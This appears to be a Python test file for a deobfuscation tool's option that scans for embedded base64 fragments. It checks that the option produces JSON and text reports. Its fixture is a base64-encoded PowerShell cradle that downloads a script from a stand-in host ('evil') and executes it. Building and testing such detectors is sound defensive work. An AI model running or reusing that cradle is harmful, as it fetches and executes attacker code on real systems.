"""CLI tests for optional embedded-fragment scanning."""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
from pathlib import Path
import unittest


TOOL_DIRECTORY = Path(__file__).resolve().parents[1]
SCRIPT = TOOL_DIRECTORY / "tradecraft_unwrapper.py"


class EmbeddedCliTests(unittest.TestCase):
    """Validate that --scan-embedded creates sidecar reports."""

    def test_scan_embedded_writes_json_and_text_reports(self) -> None:
        text = (
            '$s = "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp'
            'LkRvd25sb2FkU3RyaW5nKCJodHRwOi8vZXZpbC94Iik="'
        )

        with tempfile.TemporaryDirectory() as temporary_directory:
            output_directory = Path(temporary_directory) / "embedded-output"

            completed = subprocess.run(
                [
                    sys.executable,
                    str(SCRIPT),
                    "--text",
                    text,
                    "--scan-embedded",
                    "-o",
                    str(output_directory),
                ],
                cwd=TOOL_DIRECTORY,
                text=True,
                capture_output=True,
                check=False,
            )

            self.assertEqual(completed.returncode, 0, completed.stderr)
            self.assertIn("Embedded fragments reported: 1", completed.stdout)

            json_path = output_directory / "embedded_fragments.json"
            text_path = output_directory / "embedded_fragments.txt"

            self.assertTrue(json_path.exists())
            self.assertTrue(text_path.exists())

            payload = json.loads(json_path.read_text(encoding="utf-8"))
            self.assertEqual(payload["count"], 1)
            self.assertEqual(
                payload["candidates"][0]["kind"],
                "embedded-base64",
            )
            self.assertIn(
                "New-Object Net.WebClient",
                payload["candidates"][0]["decoded_preview"],
            )
            self.assertIn(
                "embedded-base64",
                text_path.read_text(encoding="utf-8"),
            )

    def test_embedded_reports_are_not_written_without_flag(self) -> None:
        text = (
            '$s = "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp'
            'LkRvd25sb2FkU3RyaW5nKCJodHRwOi8vZXZpbC94Iik="'
        )

        with tempfile.TemporaryDirectory() as temporary_directory:
            output_directory = Path(temporary_directory) / "normal-output"

            completed = subprocess.run(
                [
                    sys.executable,
                    str(SCRIPT),
                    "--text",
                    text,
                    "-o",
                    str(output_directory),
                ],
                cwd=TOOL_DIRECTORY,
                text=True,
                capture_output=True,
                check=False,
            )

            self.assertEqual(completed.returncode, 0, completed.stderr)
            self.assertFalse(
                (output_directory / "embedded_fragments.json").exists()
            )
            self.assertFalse(
                (output_directory / "embedded_fragments.txt").exists()
            )


if __name__ == "__main__":
    unittest.main()
